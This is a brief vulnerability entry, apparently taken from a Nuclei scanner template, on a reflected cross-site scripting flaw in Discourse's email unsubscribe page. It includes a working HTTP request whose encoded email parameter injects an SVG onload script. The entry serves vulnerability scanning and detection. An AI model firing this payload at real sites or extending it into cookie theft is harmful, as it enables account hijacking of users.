# Vulnerability: Discourse - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`discourse-xss.yaml`)

## Description
Discourse contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
```

